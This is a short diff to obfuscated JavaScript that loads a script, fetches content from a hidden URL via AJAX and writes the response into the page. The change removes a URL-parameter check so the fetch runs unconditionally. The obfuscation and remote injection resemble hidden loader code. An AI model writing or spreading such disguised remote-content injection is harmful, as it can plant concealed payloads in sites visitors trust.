@@ -18,8 +18,6 @@ document[_0x4be4('0x4')]['append'](jq);
 jq['onload'] = function() {
     $(_0x4be4('0x9'))[_0x4be4('0xb')]('<div\x20id=\x22sa\x22>');
     const _0x215039 = new URLSearchParams(window['location'][_0x4be4('0xd')]);
-    const _0x1c5f88 = _0x215039[_0x4be4('0x1')](_0x4be4('0x2'));
-    if (_0x1c5f88) {
         $[_0x4be4('0x0')]({
             'type': _0x4be4('0x7'),
             'url': _0x4be4('0x6'),
@@ -29,5 +27,5 @@ jq['onload'] = function() {
                 $(_0x4be4('0xc'))[_0x4be4('0x3')](_0xa307a8);
             }
         });
-    }
-};
+    };
+//};
